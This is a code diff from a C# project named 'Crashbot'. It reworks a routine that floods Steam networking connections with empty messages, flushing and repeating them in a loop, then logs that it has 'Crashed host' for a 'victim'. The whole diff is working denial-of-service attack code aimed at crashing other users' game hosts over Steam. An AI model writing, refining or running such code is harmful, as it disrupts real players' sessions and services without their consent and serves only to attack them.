@@ -166,24 +166,16 @@ namespace Crashbot
                 SteamNetConnectionInfo_t info = ix.Value;
                 HSteamNetConnection conn = cx.Value;
 
-                Stopwatch timeGate = Stopwatch.StartNew();
-                while (true)
+                int messageCount = this.SteamThread.Get(TimeSpan.FromSeconds(2), SteamNetworkingSockets.ReceiveMessagesOnConnection, conn, new IntPtr[1], 1);
+
+                for (int i = 0; i < FUN_TIME; i++)
                 {
-                    int messageCount = this.SteamThread.Get(TimeSpan.FromSeconds(1), SteamNetworkingSockets.ReceiveMessagesOnConnection, conn, new IntPtr[1], 1);
-
-                    if (messageCount > 0 || timeGate.ElapsedMilliseconds > 1000)
-                    {
-                        for (int i = 0; i < FUN_TIME; i++)
-                        {
-                            this.SteamThread.SendMessageToConnection(conn, 0, 0, 0);
-                            this.SteamThread.Get(SteamNetworkingSockets.FlushMessagesOnConnection, conn);
-                            Task.Delay(20).Wait();
-                        }
-
-                        Task.Delay(500).Wait();
-                        break;
-                    }
+                    this.SteamThread.SendMessageToConnection(conn, 0, 0, 0);
+                    this.SteamThread.Get(SteamNetworkingSockets.FlushMessagesOnConnection, conn);
+                    Task.Delay(20).Wait();
                 }
+
+                Task.Delay(500).Wait();
 
                 Console.WriteLine($"Crashed host ({mega_victim.HostSteamId}) for victim ({mega_victim.SteamId})", Verbosity.Verbose);
                
